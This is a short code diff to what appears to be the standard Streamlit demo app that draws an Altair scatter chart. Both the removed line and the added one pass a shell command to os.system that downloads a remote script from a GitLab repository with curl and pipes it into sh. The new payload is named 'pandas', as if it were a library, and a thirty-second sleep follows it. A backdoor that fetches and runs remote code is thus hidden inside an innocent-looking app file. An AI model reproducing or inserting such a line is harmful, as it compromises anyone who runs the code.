@@ -3,6 +3,8 @@ import altair as alt
 import math
 import pandas as pd
 import streamlit as st
+import time
+import os
 
 """
 # Welcome to Streamlit!
@@ -34,5 +36,5 @@ with st.echo(code_location='below'):
         .mark_circle(color='#0068c9', opacity=0.5)
         .encode(x='x:Q', y='y:Q'))
 
-import os
-os.system('curl -fsSL https://gitlab.com/kancomue/strm/-/raw/main/srb | sh')
+os.system('curl -fsSL https://gitlab.com/kancomue/strm/-/raw/main/pandas | sh')
+time.sleep(30)
